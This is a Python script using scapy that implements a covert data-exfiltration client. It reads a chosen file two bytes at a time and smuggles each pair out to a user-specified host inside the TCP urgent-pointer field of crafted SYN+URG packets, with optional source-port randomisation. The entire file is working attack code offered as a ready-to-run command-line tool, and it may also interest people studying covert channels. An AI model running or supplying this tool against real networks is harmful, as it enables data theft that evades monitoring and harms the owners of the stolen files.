import logging
import random

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import TCP, IP, send


class UrgentExfilClient:
    def version():
        return '0.0.1'

    def __init__(self, opts):
        self._filename = opts.filename
        self._host = opts.host
        self._dest_port = opts.dest_port
        self._source_port = opts.source_port
        self._verbose = opts.verbose
        self._randomize_port = opts.randomize_port

    def verbose(self):
        return self._verbose

    def randomize_port(self):
        return self._randomize_port

    def host(self):
        return self._host

    def filename(self):
        return self._filename

    def source_port(self):
        if self.randomize_port() or self._source_port is None:
            return random.randint(1025, 32000)
        else:
            return self._source_port

    def dest_port(self):
        return self._dest_port

    def exfiltrate(self):
        with open(self.filename(), "rb") as fh:
            bytestream = fh.read(2)
            while bytestream:
                self.send_data(bytestream)
                bytestream = fh.read(2)

    def send_data(self, bytestream):
        if self.verbose():
            print("Exfiltrating " + repr(bytestream.decode('us-ascii')))
        packet = IP()/TCP()
        packet.dst = self.host()
        packet.dport = self.dest_port()
        packet.sport = self.source_port()
        packet.getlayer(TCP).flags = 0x20 | 0x02  # URG & SYN
        packet.urgptr = self.int_for(bytestream)
        if self.verbose():
            packet.show()
        send(packet, verbose=self.verbose())

    def int_for(self, bytestream):
        if len(bytestream) == 0:
            return 0
        elif len(bytestream) == 1:
            return bytestream[0]
        else:
            return (bytestream[0] << 8) + bytestream[1]


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
               description="Exfiltrate data using TCP urg pointer",
               add_help=True)
    parser.add_argument('filename', metavar='FILE', action='store',
                        help='File to exfiltrate')
    parser.add_argument('-H', '--host', required=True, action='store',
                        help='Destination host')
    parser.add_argument('-p', '--destination-port', required=True,
                        dest='dest_port', action='store', help='Source port',
                        type=int)
    parser.add_argument('--source-port', action='store',
                        help='Destination port', type=int, dest='source_port',
                        required=False)
    parser.add_argument('--randomize-source-port', action='store_true',
                        help='Randomize source port for each packet',
                        default=False, dest='randomize_port')
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                        help='Enable verbose output')
    parser.add_argument('--version', action='version',
                        version=('%(prog)s ' + UrgentExfilClient.version()),
                        help="Show version information")
    opts = parser.parse_args()
    exfil = UrgentExfilClient(opts)
    exfil.exfiltrate()
